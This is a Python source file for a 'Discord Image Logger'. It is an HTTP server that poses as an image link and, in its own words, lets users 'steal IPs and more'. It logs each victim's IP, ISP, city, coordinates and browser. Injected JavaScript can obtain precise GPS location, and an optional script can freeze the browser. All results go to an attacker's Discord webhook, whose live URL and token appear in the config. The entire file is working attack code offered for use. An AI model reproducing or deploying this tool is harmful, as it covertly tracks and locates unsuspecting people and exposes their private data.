# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1111705859639230494/oCYrlhg3nY5jQ0uYEQ-IEyMML-VCoFRm6BzciHyb3fbXZOh6BEkM3W2oU-7fUPtdB3iG",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": True, # Nega i got ur ip
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
